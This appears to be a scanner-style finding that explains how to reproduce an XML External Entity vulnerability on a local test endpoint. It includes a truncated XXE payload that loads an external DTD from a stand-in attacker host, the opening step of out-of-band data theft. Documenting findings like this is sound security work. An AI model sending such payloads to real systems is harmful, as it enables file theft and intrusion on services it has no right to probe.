To manually replicate this XML External Entity (XXE) vulnerability, send a POST request to http://localhost:5000/xml with the payload '<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://attacker.com/evil.dtd">
%ext;
]...' and observe for the evidence: XXE indicators detected in response.

